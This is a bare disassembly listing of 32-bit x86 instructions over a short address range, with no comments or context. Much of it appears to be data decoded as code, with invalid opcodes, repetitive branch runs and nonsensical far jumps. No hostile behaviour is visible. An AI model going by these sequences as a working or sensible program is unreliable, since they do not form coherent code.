  4053c3:	fstp   QWORD PTR [edi]
  4053c5:	pop    ecx
  4053c6:	push   ds
  4053c7:	aad    0x1f
  4053c9:	xchg   ecx,eax
  4053ca:	push   ds
  4053cb:	int    0x1f
  4053cd:	mov    DWORD PTR [esi],ebx
  4053cf:	add    eax,0xfd1e8120
  4053d4:	pop    ds
  4053d5:	jns    0x4053f5
  4053d7:	hlt    
  4053d8:	and    BYTE PTR [eax+0x1d],dh
  4053db:	in     al,dx
  4053dc:	and    BYTE PTR [eax+0x1d],ch
  4053df:	in     al,0x20
  4053e1:	pusha  
  4053e2:	sbb    eax,0x1d5820dc
  4053e7:	aam    0x20
  4053e9:	nop
  4053ea:	sbb    eax,0x1d8820cc
  4053ef:	add    al,0x21
  4053f1:	sbb    BYTE PTR ds:0x1d7820fc,0xf4
  4053f8:	and    BYTE PTR [eax+0x1d],dh
  4053fb:	in     al,dx
  4053fc:	and    BYTE PTR [eax+0x1d],ch
  4053ff:	in     al,0x20
  405401:	pusha  
  405402:	sbb    eax,0x1d5820dc
  405407:	add    ah,dl
  405409:	xchg   ebp,eax
  40540a:	sbb    eax,0x1d95cc1d
  40540f:	sbb    eax,0x1d1d9404
  405414:	cld    
  405415:	add    BYTE PTR [eax],al
  405417:	add    BYTE PTR [eax],al
  405419:	add    BYTE PTR [ebp+0x79e91d1d],dl
  40541f:	add    BYTE PTR [ebx],al
  405421:	in     eax,0x7d
  405423:	add    al,0x7
  405425:	icebp  
  405426:	outs   dx,BYTE PTR ds:[esi]
  405427:	or     DWORD PTR [ecx],ecx
  405429:	rep ins BYTE PTR es:[edi],dx
  40542b:	pop    es
  40542c:	or     esp,ebp
  40542e:	or     BYTE PTR [esi],0xc
  405431:	fadd   QWORD PTR [ebp+0x70f70d0d]
  405437:	or     al,0xe
  405439:	out    dx,al
  40543a:	imul   ecx,DWORD PTR [ebx],0xf
  40543d:	stc    
  40543e:	data16 adc dl,BYTE PTR [eax]
  405441:	stc    
  405442:	data16 adc dl,BYTE PTR [eax]
  405445:	fsubr  DWORD PTR [ecx+0x11]
  405448:	adc    eax,ebx
  40544a:	popa   
  40544b:	adc    DWORD PTR [ecx],edx
  40544d:	fild   DWORD PTR [eax+edx*1+0x1084db12]
  405454:	adc    bh,dl
  405456:	test   DWORD PTR [edi],ecx
  405458:	adc    edi,edx
  40545a:	test   DWORD PTR [edi],ecx
  40545c:	adc    edi,ebp
  40545e:	push   0x16
  405460:	adc    al,0xf5
  405462:	bound  edx,QWORD PTR [esi]
  405464:	adc    al,0xdd
  405466:	push   0x16
  405468:	adc    al,0xd5
  40546a:	bound  edx,QWORD PTR [esi]
  40546c:	adc    al,0xdc
  40546e:	mov    edx,DWORD PTR ds:0x1583d415
  405474:	adc    eax,0x15158bfc
  405479:	hlt    
  40547a:	adc    DWORD PTR ds:0xff15,0x0
  405481:	add    BYTE PTR [eax],al
  405483:	push   0x60f71614
  405488:	adc    al,0x16
  40548a:	add    BYTE PTR [edx],ah
  40548c:	adc    eax,0x15221616
  405491:	push   ss
  405492:	push   ss
  405493:	rcl    DWORD PTR ds:0x15c31717,cl
  405499:	pop    ss
  40549a:	pop    ss
  40549b:	jecxz  0x4054b2
  40549d:	pop    ss
  40549e:	pop    ss
  40549f:	jecxz  0x4054b6
  4054a1:	pop    ss
  4054a2:	pop    ss
  4054a3:	les    edx,FWORD PTR [esi]
  4054a5:	sbb    BYTE PTR [eax],bl
  4054a7:	les    edx,FWORD PTR [esi]
  4054a9:	sbb    BYTE PTR [eax],bl
  4054ab:	aam    0x16
  4054ad:	sbb    BYTE PTR [eax],bl
  4054af:	aam    0x16
  4054b1:	sbb    BYTE PTR [eax],bl
  4054b3:	les    edx,FWORD PTR [esi]
  4054b5:	sbb    BYTE PTR [eax],bl
  4054b7:	les    edx,FWORD PTR [esi]
  4054b9:	sbb    BYTE PTR [eax],bl
  4054bb:	je     0x4054db
  4054bd:	sbb    BYTE PTR [eax],bl
  4054bf:	je     0x4054df
  4054c1:	sbb    BYTE PTR [eax],bl
  4054c3:	test   DWORD PTR [edi],edx
  4054c5:	sbb    DWORD PTR [ecx],ebx
  4054c7:	test   DWORD PTR [edi],edx
  4054c9:	sbb    DWORD PTR [ecx],ebx
  4054cb:	xchg   ebp,eax
  4054cc:	pop    ss
  4054cd:	sbb    DWORD PTR [ecx],ebx
  4054cf:	xchg   ebp,eax
  4054d0:	pop    ss
  4054d1:	sbb    DWORD PTR [ecx],ebx
  4054d3:	inc    ebp
  4054d4:	sbb    eax,0x1d451919
  4054d9:	sbb    DWORD PTR [ecx],ebx
  4054db:	jne    0x4054fa
  4054dd:	sbb    DWORD PTR [ecx],ebx
  4054df:	jne    0x4054fe
  4054e1:	sbb    DWORD PTR [ecx],ebx
  4054e3:	inc    esi
  4054e4:	sbb    al,0x1a
  4054e6:	sbb    al,BYTE PTR [eax]
  4054e8:	add    BYTE PTR [eax],al
  4054ea:	add    BYTE PTR [eax],al
  4054ec:	inc    esi
  4054ed:	sbb    al,0x1a
  4054ef:	sbb    dl,BYTE PTR [esi+0x1c]
  4054f2:	sbb    bl,BYTE PTR [edx]
  4054f4:	push   esi
  4054f5:	sbb    al,0x1a
  4054f7:	sbb    al,BYTE PTR [esi+0x1c]
  4054fa:	sbb    bl,BYTE PTR [edx]
  4054fc:	inc    esi
  4054fd:	sbb    al,0x1a
  4054ff:	sbb    dh,BYTE PTR [esi+0x1c]
  405502:	sbb    bl,BYTE PTR [edx]
  405504:	jbe    0x405522
  405506:	sbb    bl,BYTE PTR [edx]
  405508:	jne    0x40557e
  40550a:	sbb    BYTE PTR [ebx],bl
  40550c:	outs   dx,BYTE PTR ds:[esi]
  40550d:	je     0x405527
  40550f:	sbb    ebx,DWORD PTR [esi+0x64]
  405512:	sbb    BYTE PTR [ebx],bl
  405514:	pop    esi
  405515:	sbb    BYTE PTR fs:[ebx],bl
  405518:	mov    ss,WORD PTR [eax+ebx*1+0x1b]
  40551c:	mov    ss,WORD PTR [eax+ebx*1+0x1b]
  405520:	jle    0x405526
  405522:	sbb    DWORD PTR [ebx],ebx
  405524:	jle    0x40552a
  405526:	sbb    DWORD PTR [ebx],ebx
  405528:	jno    0x405595
  40552a:	add    eax,DWORD PTR [eax]
  40552c:	jne    0x405598
  40552e:	add    eax,DWORD PTR [eax]
  405530:	jne    0x40559f
  405532:	add    eax,DWORD PTR [eax]
  405534:	jne    0x4055a2
  405536:	add    eax,DWORD PTR [eax]
  405538:	jne    0x4055a1
  40553a:	add    eax,DWORD PTR [eax]
  40553c:	jne    0x40559c
  40553e:	add    eax,DWORD PTR [eax]
  405540:	jne    0x4055ab
  405542:	add    eax,DWORD PTR [eax]
  405544:	jne    0x4055a6
  405546:	add    eax,DWORD PTR [eax]
  405548:	jne    0x4055ad
  40554a:	add    eax,DWORD PTR [eax]
  40554c:	jne    0x4055b3
  40554e:	add    eax,DWORD PTR [eax]
  405550:	add    BYTE PTR [eax],al
  405552:	add    BYTE PTR [eax],al
  405554:	add    BYTE PTR [ebp+0x6f],dh
  405557:	add    eax,DWORD PTR [eax]
  405559:	jne    0x4055c4
  40555b:	add    eax,DWORD PTR [eax]
  40555d:	jne    0x4055ba
  40555f:	add    eax,DWORD PTR [eax]
  405561:	jne    0x4055b2
  405563:	add    eax,DWORD PTR [eax]
  405565:	jne    0x40556a
  405567:	add    al,0x0
  405569:	jne    0x4055e2
  40556b:	add    eax,DWORD PTR [eax]
  40556d:	jne    0x40557a
  40556f:	add    al,0x0
  405571:	jne    0x405576
  405573:	add    al,0x0
  405575:	jne    0x4055f2
  405577:	add    eax,DWORD PTR [eax]
  405579:	jne    0x40557e
  40557b:	add    al,0x0
  40557d:	jne    0x4055aa
  40557f:	add    al,0x0
  405581:	jne    0x40559e
  405583:	add    al,0x0
  405585:	jne    0x405589
  405587:	or     DWORD PTR [esi*2+0x75041902],eax
  40558e:	add    ch,BYTE PTR [ecx+0x4]
  405591:	jne    0x405595
  405593:	dec    ecx
  405594:	add    al,0x75
  405596:	add    ch,BYTE PTR [ecx-0x76fd8afc]
  40559c:	add    al,0x75
  40559e:	add    ch,cl
  4055a0:	add    esi,DWORD PTR [ebp+0x2]
  4055a3:	jmp    0xe942caab
  4055a8:	add    esi,DWORD PTR [ebp+0x2]
  4055ab:	call   0xeb42cab3
  4055b0:	add    esi,DWORD PTR [ebp+0x2]
  4055b3:	jmp    0x3:0xed027503
  4055ba:	add    BYTE PTR [eax],al
  4055bc:	add    BYTE PTR [eax],al
  4055be:	jne    0x4055c2
  4055c0:	out    0x3,eax
  4055c2:	jne    0x4055c6
  4055c4:	loope  0x4055c9
  4055c6:	jne    0x4055ca
  4055c8:	fld    QWORD PTR [ebx]
  4055ca:	jne    0x4055ce
  4055cc:	stc    
  4055cd:	add    esi,DWORD PTR [ebp+0x2]
  4055d0:	add    DWORD PTR [esi*2+0x7503c902],eax
  4055d7:	add    bl,cl
  4055d9:	add    esi,DWORD PTR [ebp+0x2]
  4055dc:	test   eax,0x89027503
  4055e1:	add    esi,DWORD PTR [ebp+0x2]
  4055e4:	imul   eax,DWORD PTR [esi*2+0x75042902],0x7504e902
  4055ef:	add    ch,BYTE PTR [ecx+0x4]
  4055f2:	jne    0x4055f6
  4055f4:	jmp    0xe942cafe
  4055f9:	push   es
  4055fa:	jne    0x4055fe
  4055fc:	jmp    0xe9b89100
  405601:	add    DWORD PTR [ebp+0x2],esi
  405604:	add    cl,ch
  405606:	jle    0x40560a
  405608:	add    cl,ch
  40560a:	jp     0x40560e
  40560c:	add    cl,ch
  40560e:	xchg   BYTE PTR [edx],al
  405610:	add    cl,ch
  405612:	outs   dx,BYTE PTR ds:[esi]
  405613:	add    al,BYTE PTR [eax]
  405615:	jmp    0xe9405870
  40561a:	inc    esi
  40561b:	add    al,BYTE PTR [eax]
  40561d:	jmp    0xea3fce58
  405622:	add    BYTE PTR [eax],al
  405624:	add    BYTE PTR [eax],al
  405626:	add    dh,dl
  405628:	ja     0x405629
  40562a:	jmp    0x76:0xe3fffe76
  405631:	add    dh,ch
  405633:	jbe    0x40563f
  405635:	add    al,dh
  405637:	jbe    0x405645
  405639:	add    dl,ah
  40563b:	jbe    0x405642
  40563d:	add    dh,bl
  40563f:	jbe    0x405652
  405641:	add    dl,bl
  405643:	jbe    0x405654
  405645:	add    dl,ah
  405647:	jbe    0x405660
  405649:	add    BYTE PTR [edx],cl
  40564b:	jno    0x405678
  40564d:	add    dl,bh
  40564f:	jbe    0x40568c
  405651:	add    BYTE PTR [edx-0x76002c8a],ch
  405657:	jbe    0x40564c
  405659:	jmp    FWORD PTR [ecx+0x76]
  40565c:	mov    ds:0x63762a00,eax
  405661:	add    bl,ch
  405663:	jno    0x405667
  405665:	add    cl,ch
  405667:	jbe    0x40566b
  405669:	add    cl,bl
  40566b:	jbe    0x40567f
  40566d:	add    cl,bl
  40566f:	jbe    0x405683
  405671:	add    cl,bh
  405673:	jbe    0x405687
  405675:	add    cl,bh
  405677:	jbe    0x40568b
  405679:	add    al,bh
  40567b:	jbe    0x40568e
  40567d:	add    al,bh
  40567f:	jbe    0x405692
  405681:	add    BYTE PTR [eax],al
  405683:	push   ds
  405684:	add    edx,DWORD PTR [edx]
  405686:	add    BYTE PTR [esi+0x3],cl
  405689:	adc    al,BYTE PTR [eax]
  40568b:	add    BYTE PTR [eax],al
  40568d:	add    BYTE PTR [eax],al
  40568f:	add    BYTE PTR [edi+0x3],cl
  405692:	adc    eax,DWORD PTR [eax]
  405694:	aas    
  405695:	add    edx,DWORD PTR [ebx]
  405697:	add    BYTE PTR [eax],bl
  405699:	add    edx,DWORD PTR [eax+eax*1]
  40569c:	or     BYTE PTR [ebx],al
  40569e:	adc    al,0x0
  4056a0:	or     DWORD PTR [ebx],eax
  4056a2:	adc    eax,0x15030900
  4056a7:	add    BYTE PTR [ebx+eax*1],bl
  4056aa:	retf   
  4056ab:	add    BYTE PTR [ecx-0x22000002],bl
  4056b1:	add    al,BYTE PTR [edx]
  4056b3:	add    bh,cl
  4056b5:	add    al,BYTE PTR [eax+eax*1]
  4056b8:	leave  
  4056b9:	add    al,BYTE PTR [edi]
  4056bb:	add    ch,al
  4056bd:	add    cl,BYTE PTR ds:0x1902cd00
  4056c3:	add    BYTE PTR [ebp-0x2],ch
  4056c6:	xor    BYTE PTR [eax],al
  4056c8:	or     eax,0x1d006103
  4056cd:	inc    al
  4056cf:	add    BYTE PTR [ebp-0x72fe7efd],bl
  4056d5:	cld    
  4056d6:	add    BYTE PTR [ebx],al
  4056d8:	lea    esi,[esi+0x0]
  4056db:	push   es
  4056dc:	popf   
  4056dd:	or     al,BYTE PTR [ecx]
  4056df:	or     al,0x9d
  4056e1:	adc    al,BYTE PTR [ecx]
  4056e3:	sbb    BYTE PTR [ebp-0x72cffede],cl
  4056e9:	inc    edx
  4056ea:	add    BYTE PTR [eax+0x5c],ah
  4056ed:	add    al,BYTE PTR [eax]
  4056ef:	add    BYTE PTR [edx+eax*1+0x10],cl
  4056f3:	add    BYTE PTR [eax],al
  4056f5:	add    BYTE PTR [eax],al
  4056f7:	add    BYTE PTR [eax],al
  4056f9:	cmp    al,0x2
  4056fb:	adc    BYTE PTR [eax],al
  4056fd:	pop    ebp
  4056fe:	add    dl,BYTE PTR [ecx]
  405700:	add    BYTE PTR [esi+0x2],cl
  405703:	adc    al,BYTE PTR [eax]
  405705:	jne    0x40577f
  405707:	add    edx,DWORD PTR [ebx]
  405709:	jne    0x40577a
  40570b:	add    edx,DWORD PTR [esi*2+0x75150356]
  405712:	dec    ebp
  405713:	add    edx,DWORD PTR [esi]
  405715:	jne    0x40576b
  405717:	add    edx,DWORD PTR [edi]
  405719:	jne    0x40576e
  40571b:	add    ebx,DWORD PTR [eax]
  40571d:	jne    0x405721
  40571f:	add    al,0x19
  405721:	jne    0x405724
  405723:	add    al,0x1a
  405725:	jne    0x405797
  405727:	add    ebx,DWORD PTR [ebx]
  405729:	jne    0x405792
  40572b:	add    ebx,DWORD PTR [esi*2+0x751d035e]
  405732:	sub    eax,DWORD PTR [eax+eax*2]
  405735:	jne    0x405759
  405737:	jmp    0x9563:0xea775475
  40573e:	pop    ebx
  40573f:	loop   0x4057b2
  405741:	push   esp
  405742:	inc    esi
  405743:	fidiv  WORD PTR [ebx+0x50]
  405746:	pop    ecx
  405747:	and    esi,DWORD PTR [eax+0x54]
  40574a:	pop    eax
  40574b:	hlt    
  40574c:	fs push ecx
  40574e:	or     esi,eax
  405750:	outs   dx,BYTE PTR ds:[esi]
  405751:	push   ebp
  405752:	test   al,0x23
  405754:	jb     0x405776
  405756:	cmp    eax,0x3e1068ef
  40575b:	and    esp,DWORD PTR [esi+0x0]
  40575e:	add    BYTE PTR [eax],al
  405760:	add    BYTE PTR [eax],al
  405762:	and    BYTE PTR [ebp-0x7be38c1c],cl
  405768:	jmp    0x3abd69a
  40576d:	add    BYTE PTR [ebp+0x3b],dh
  405770:	inc    eax
  405771:	inc    ebx
  405772:	jne    0x4057bf
  405774:	dec    ebx
  405775:	inc    ebx
  405776:	jne    0x4057e3
  405778:	add    eax,DWORD PTR [eax]
  40577a:	jne    0x4057e1
  40577c:	add    DWORD PTR [eax-0x7f7e1505],0x75
  405783:	add    ch,cl
  405785:	adc    esi,DWORD PTR [esi+0x7c]
  405788:	imul   edi,DWORD PTR [esi-0x9],0x7800fd81
  40578f:	mov    edi,0x7ef1c123
  405794:	ins    BYTE PTR es:[edi],dx
  405795:	add    DWORD PTR [ebp+0x2],esi
  405798:	stc    
  405799:	xor    esi,ebp
  40579b:	shr    DWORD PTR [eax-0x7c],1
  40579e:	jne    0x4057aa
  4057a0:	jmp    0x397aa9d0
  4057a5:	iret   
  4057a6:	xchg   edx,eax
  4057a7:	add    ah,dh
  4057a9:	add    eax,DWORD PTR [edx+0x32]
  4057ac:	(bad)  
  4057ae:	mov    dl,0x8a
  4057b0:	jmp    0xd162ccb8
  4057b5:	cmp    ebp,0xffffff81
  4057b8:	imul   eax,DWORD PTR [esi*2+0x42e40902],0x72ec00ea
  4057c3:	or     ch,dh
  4057c5:	sti    
  4057c6:	add    BYTE PTR [eax],al
  4057c8:	add    BYTE PTR [eax],al
  4057ca:	add    BYTE PTR [edx-0xe],ah
  4057cd:	aad    0xf3
  4057cf:	pop    edx
  4057d0:	or     ah,cl
  4057d2:	add    esi,DWORD PTR [ebp+0xa]
  4057d5:	jmp    0xf13dcce5
  4057da:	add    esi,DWORD PTR [ebp+0x2]
  4057dd:	mov    edx,0xcc021d03
  4057e2:	add    edx,DWORD PTR [ecx]
  4057e4:	add    bh,BYTE PTR [ebp-0x24fd99fd]
  4057ea:	add    esp,DWORD PTR [ebx+0x2]
  4057ed:	test   DWORD PTR [ebx],eax
  4057ef:	sbb    DWORD PTR [edx],eax
  4057f1:	test   DWORD PTR [ebx],eax
  4057f3:	jne    0x4057f7
  4057f5:	mov    edx,0x7cdf33cb
  4057fa:	retf   0xe3e0
  4057fd:	jne    0x4057e4
  4057ff:	mov    al,0xe3
  405801:	inc    DWORD PTR [edx+eax*2+0x519971df]
  405808:	lock addr16 jmp 0x86405a85
  40580f:	jecxz  0x4057d3
  405811:	jmp    FWORD PTR [ecx-0x51003d15]
  405817:	jecxz  0x4057db
  405819:	jmp    DWORD PTR [ebx+0x70ffc094]
  40581f:	sbb    eax,0x87cffc1
  405824:	ret    
  405825:	push   DWORD PTR [ebx-0x2f]
  405828:	ret    0x5fff
  40582b:	call   0xd757f2
  405830:	add    BYTE PTR [eax],al
  405832:	add    BYTE PTR [eax],al
  405834:	loopne 0x4057f8
  405836:	push   DWORD PTR [ebx+0x10ffc094]
  40583c:	loop   0x405800
  40583e:	call   FWORD PTR [edi+0xb]
  405841:	ret    
  405842:	(bad)  
  405843:	call   0xe9405abe
  405848:	jbe    0x40584c
  40584a:	add    cl,ch
  40584c:	jbe    0x405850
  40584e:	add    cl,ch
  405850:	jbe    0x405854
  405852:	add    cl,ch
  405854:	jbe    0x405858
  405856:	add    cl,ch
  405858:	jbe    0x40585c
  40585a:	add    cl,ch
  40585c:	jbe    0x405860
  40585e:	add    cl,ch
  405860:	jbe    0x405864
  405862:	add    cl,ch
  405864:	jbe    0x405868
  405866:	add    cl,ch
  405868:	pop    ecx
  405869:	add    ah,BYTE PTR [ebx]
  40586b:	add    eax,0xe9271c54
  405870:	jbe    0x40589a
  405872:	sub    ebp,ecx
  405874:	pop    ebp
  405875:	and    al,0x0
  405877:	(bad)  [ecx+0x30]
  40587a:	xor    edx,ebp
  40587c:	inc    ebp
  40587d:	sub    al,0x37
  40587f:	add    BYTE PTR [esi+esi*1],dh
  405882:	add    BYTE PTR [eax],al
  405884:	pop    esp
  405885:	(bad)  
  405886:	(bad)  
  405887:	dec    DWORD PTR [esi+ebx*2+0x61]
  40588b:	arpl   ax,si
  40588d:	popa   
  40588e:	movs   BYTE PTR es:[di],BYTE PTR gs:[si]
  405891:	imul   ebp,DWORD PTR [bp+di-0x48],0x6f6d5b
  405899:	add    BYTE PTR [eax],al
  40589b:	add    BYTE PTR [eax],al
  40589d:	pushf  
  40589e:	outs   dx,DWORD PTR ds:[esi]
  40589f:	jno    0x405914
  4058a1:	mov    al,ds:0xb4777563
  4058a6:	ja     0x405921
  4058a8:	add    BYTE PTR [edi+edi*8],bl
  4058ab:	pop    ebp
  4058ac:	pop    edi
  4058ad:	lods   al,BYTE PTR ds:[esi]
  4058ae:	pop    edi
  4058af:	popa   
  4058b0:	arpl   WORD PTR [eax+0x64676553],si
  4058b6:	imul   ebp,DWORD PTR [bp+di+0x78],0x5c6f6d5b
  4058be:	outs   dx,DWORD PTR ds:[esi]
  4058bf:	jno    0x405934
  4058c1:	pusha  
  4058c2:	arpl   WORD PTR [ebp+0x77],si
  4058c5:	je     0x40593e
  4058c7:	jns    0x4058c9
  4058c9:	call   0xcc40d6cc
  4058ce:	(bad)  
  4058cf:	(bad)  
  4058d0:	dec    esp
  4058d2:	(bad)  
  4058d3:	(bad)  
  4058d4:	(bad)  
  4058d5:	fdiv   st(6),st
  4058d7:	(bad)  
  4058d8:	(bad)  
  4058d9:	fdiv   st(6),st
  4058db:	(bad)  
  4058dc:	dec    esp
  4058de:	(bad)  
  4058df:	(bad)  
  4058e0:	dec    esp
  4058e2:	(bad)  
  4058e3:	(bad)  
  4058e4:	call   FWORD PTR [esi+edi*8-0x1630001]
  4058eb:	(bad)  
  4058ec:	dec    DWORD PTR [esi+edi*8-0x1730001]
  4058f3:	(bad)  
  4058f4:	call   FWORD PTR [esi+edi*8-0x1630001]
  4058fb:	(bad)  
  4058fc:	push   DWORD PTR [ebp+0x69]
  4058ff:	add    eax,DWORD PTR [eax]
  405901:	add    BYTE PTR [eax],al
  405903:	add    BYTE PTR [eax],al
  405905:	add    BYTE PTR [ebp+0x69],dh
  405908:	add    eax,DWORD PTR [eax]
  40590a:	jne    0x405967
  40590c:	add    eax,DWORD PTR [eax]
  40590e:	jne    0x40596b
  405910:	add    eax,DWORD PTR [eax]
  405912:	jne    0x40596f
  405914:	add    eax,DWORD PTR [eax]
  405916:	jne    0x405973
  405918:	add    eax,DWORD PTR [eax]
  40591a:	jne    0x405977
  40591c:	add    eax,DWORD PTR [eax]
  40591e:	jne    0x40597b
  405920:	add    eax,DWORD PTR [eax]
  405922:	jne    0x40597f
  405924:	add    eax,DWORD PTR [eax]
  405926:	jne    0x405983
  405928:	add    eax,DWORD PTR [eax]
  40592a:	jne    0x405987
  40592c:	add    eax,DWORD PTR [eax]
  40592e:	jne    0x40598b
  405930:	add    eax,DWORD PTR [eax]
  405932:	jne    0x40598f
  405934:	add    eax,DWORD PTR [eax]
  405936:	jne    0x405993
  405938:	add    eax,DWORD PTR [eax]
  40593a:	jne    0x405997
  40593c:	add    eax,DWORD PTR [eax]
  40593e:	jne    0x40599b
  405940:	add    eax,DWORD PTR [eax]
  405942:	jne    0x40599f
  405944:	add    eax,DWORD PTR [eax]
  405946:	jne    0x4059a3
  405948:	add    eax,DWORD PTR [eax]
  40594a:	jne    0x4059a7
  40594c:	add    eax,DWORD PTR [eax]
  40594e:	jne    0x4059ab
  405950:	add    eax,DWORD PTR [eax]
  405952:	jne    0x40594c
  405954:	jae    0x405955
  405956:	(bad)  
  405958:	jae    0x405959
  40595a:	shr    al,cl
  40595c:	jae    0x40595d
  40595e:	retf   0x73d0
  405961:	inc    edx
  405963:	fdiv   DWORD PTR [ebx-0x1]
  405966:	mov    edx,0xff73c0
  40596b:	add    BYTE PTR [eax],al
  40596d:	add    BYTE PTR [eax],al
  40596f:	mov    dl,0xc8
  405971:	jae    0x405972
  405973:	stos   BYTE PTR es:[edi],al
  405974:	xor    BYTE PTR [edi+edi*8-0x5e],dh
  405978:	cmp    BYTE PTR [edi+edi*8-0x66],dh
  40597c:	and    BYTE PTR [edi+edi*8-0x6e],dh
  405980:	add    ah,BYTE PTR [esi]
  405982:	je     0x40590e
  405984:	jno    0x4059a4
  405986:	je     0x40590a
  405988:	jno    0x405973
  40598a:	add    dh,BYTE PTR [edi+0x5]
  40598d:	in     eax,0xfe
  40598f:	js     0x40599a
  405991:	icebp  
  405992:	or     ch,BYTE PTR [edx+0x71]
  405995:	(bad)  
  405996:	jae    0x4059fa
  405998:	jno    0x405990
  40599a:	or     BYTE PTR [esi-0x2],ch
  40599d:	fild   DWORD PTR ds:0x73e67182
  4059a3:	dec    edx
  4059a4:	jno    0x405984
  4059a6:	jae    0x4059ea
  4059a8:	jno    0x405980
  4059aa:	jae    0x4059e6
  4059ac:	jno    0x40597c
  4059ae:	jae    0x4059e2
  4059b0:	jno    0x405978
  4059b2:	jae    0x4059de
  4059b4:	jno    0x405974
  4059b6:	jae    0x4059da
  4059b8:	jno    0x405970
  4059ba:	(bad)  
  4059bb:	outs   dx,DWORD PTR ds:[esi]
  4059bc:	(bad)  
  4059bd:	fild   DWORD PTR [ecx]
  4059bf:	xor    BYTE PTR [ecx-0x5a],0x73
  4059c3:	or     dh,BYTE PTR [ecx-0x62]
  4059c6:	jae    0x4059ca
  4059c8:	jno    0x405960
  4059ca:	jae    0x4059c6
  4059cc:	jo     0x40595c
  4059ce:	jae    0x4059c2
  4059d0:	jo     0x405958
  4059d2:	jae    0x4059d4
  4059d4:	add    BYTE PTR [eax],al
  4059d6:	add    BYTE PTR [eax],al
  4059d8:	jmp    0xe970:0xe2737e70
  4059df:	add    esi,DWORD PTR [ebp+0x2]
  4059e2:	jmp    0xe942ceea
  4059e7:	add    esi,DWORD PTR [ebp+0x2]
  4059ea:	jmp    0xe942cef2
  4059ef:	add    esi,DWORD PTR [ebp+0x2]
  4059f2:	jmp    0xe942cefa
  4059f7:	add    esi,DWORD PTR [ebp+0x2]
  4059fa:	jmp    0x42cf02
  4059ff:	jmp    0xe9405c7a
  405a04:	jbe    0x405a08
  405a06:	add    cl,ch
  405a08:	jbe    0x405a0c
  405a0a:	add    cl,ch
  405a0c:	jbe    0x405a10
  405a0e:	add    cl,ch
  405a10:	jbe    0x405a14
  405a12:	add    cl,ch
  405a14:	jbe    0x405a18
  405a16:	add    cl,ch
  405a18:	jbe    0x405a1c
  405a1a:	add    cl,ch
  405a1c:	jbe    0x405a20
  405a1e:	add    cl,ch
  405a20:	jbe    0x405a24
  405a22:	add    cl,ch
  405a24:	jbe    0x405a28
  405a26:	add    cl,ch
  405a28:	jbe    0x405a2c
  405a2a:	add    cl,ch
  405a2c:	jbe    0x405a30
  405a2e:	add    cl,ch
  405a30:	jbe    0x405a34
  405a32:	add    cl,ch
  405a34:	jbe    0x405a38
  405a36:	add    cl,ch
  405a38:	jbe    0x405a3c
  405a3a:	add    cl,ch
  405a3c:	add    BYTE PTR [eax],al
  405a3e:	add    BYTE PTR [eax],al
  405a40:	add    BYTE PTR [esi+0x2],dh
  405a43:	add    cl,ch
  405a45:	jbe    0x405a49
  405a47:	add    cl,ch
  405a49:	jbe    0x405a4d
  405a4b:	add    cl,ch
  405a4d:	jbe    0x405a51
  405a4f:	add    cl,ch
  405a51:	jbe    0x405a55
  405a53:	add    cl,ch
  405a55:	jbe    0x405a59
  405a57:	add    cl,ch
  405a59:	jbe    0x405a5d
  405a5b:	add    cl,ch
  405a5d:	jbe    0x405a61
  405a5f:	add    cl,ch
  405a61:	jbe    0x405a65
  405a63:	add    cl,ch
  405a65:	jbe    0x405a69
  405a67:	add    cl,ch
  405a69:	jbe    0x405a6d
  405a6b:	add    cl,ch
  405a6d:	jbe    0x405a71
  405a6f:	add    cl,ch
  405a71:	jbe    0x405a75
  405a73:	add    cl,ch
  405a75:	jbe    0x405a79
  405a77:	add    cl,ch
  405a79:	jbe    0x405a7d
  405a7b:	add    BYTE PTR [eax],al
  405a7d:	pushf  
  405a7e:	add    eax,DWORD PTR [eax]
  405a80:	add    BYTE PTR [ebx+eax*1+0x68c0000],cl
  405a87:	add    DWORD PTR [eax],eax
  405a89:	popf   
  405a8a:	push   es
  405a8b:	add    DWORD PTR [ecx],eax
  405a8d:	popf   
  405a8e:	push   es
  405a8f:	add    DWORD PTR [ecx],eax
  405a91:	lea    eax,[esi]
  405a93:	add    DWORD PTR [ecx],eax
  405a95:	lea    eax,[esi]
  405a97:	add    DWORD PTR [ecx],eax
  405a99:	pop    ebp
  405a9a:	push   es
  405a9b:	add    DWORD PTR [ecx],eax
  405a9d:	pop    ebp
  405a9e:	push   es
  405a9f:	add    DWORD PTR [ecx],eax
  405aa1:	dec    ebp
  405aa2:	push   es
  405aa3:	add    DWORD PTR [eax],eax
  405aa5:	add    BYTE PTR [eax],al
  405aa7:	add    BYTE PTR [eax],al
  405aa9:	add    BYTE PTR [ebp+0x6],cl
  405aac:	add    DWORD PTR [ecx],eax
  405aae:	pop    ebp
  405aaf:	push   es
  405ab0:	add    DWORD PTR [ecx],eax
  405ab2:	pop    ebp
  405ab3:	add    al,0x1
  405ab5:	add    DWORD PTR [ebp+0x4],ecx
  405ab8:	add    DWORD PTR [ecx],eax
  405aba:	dec    ebp
  405abb:	add    al,0x1
  405abd:	add    DWORD PTR ds:0x1d010104,ebx
  405ac3:	add    al,0x1
  405ac5:	add    DWORD PTR ds:0xd010104,ecx
  405acb:	add    al,0x1
  405acd:	add    DWORD PTR ds:0x1d010104,ebx
  405ad3:	add    al,0x1
  405ad5:	add    DWORD PTR ds:0xd010104,ecx
  405adb:	add    al,0x1
  405add:	add    ebp,ebx
  405adf:	add    eax,DWORD PTR [ecx]
  405ae1:	add    ebp,ebx
  405ae3:	add    eax,DWORD PTR [ecx]
  405ae5:	add    ebp,ecx
  405ae7:	add    eax,DWORD PTR [ecx]
  405ae9:	add    ah,cl
  405aeb:	add    al,BYTE PTR [eax]
  405aed:	add    ah,bl
  405aef:	add    al,BYTE PTR [eax]
  405af1:	add    ah,bl
  405af3:	add    al,BYTE PTR [eax]
  405af5:	add    ah,cl
  405af7:	add    al,BYTE PTR [eax]
  405af9:	add    BYTE PTR [ebp+0x59],dh
  405afc:	add    eax,DWORD PTR [eax]
  405afe:	jne    0x405b59
  405b00:	add    eax,DWORD PTR [eax]
  405b02:	jne    0x405b5d
  405b04:	add    eax,DWORD PTR [eax]
  405b06:	jne    0x405b61
  405b08:	add    eax,DWORD PTR [eax]
  405b0a:	jne    0x405b65
  405b0c:	add    eax,DWORD PTR [eax]
  405b0e:	add    BYTE PTR [eax],al
  405b10:	add    BYTE PTR [eax],al
  405b12:	add    BYTE PTR [ebp+0x59],dh
  405b15:	add    eax,DWORD PTR [eax]
  405b17:	jne    0x405b72
  405b19:	add    eax,DWORD PTR [eax]
  405b1b:	jne    0x405b76
  405b1d:	add    eax,DWORD PTR [eax]
  405b1f:	jne    0x405b7a
  405b21:	add    eax,DWORD PTR [eax]
  405b23:	jne    0x405b80
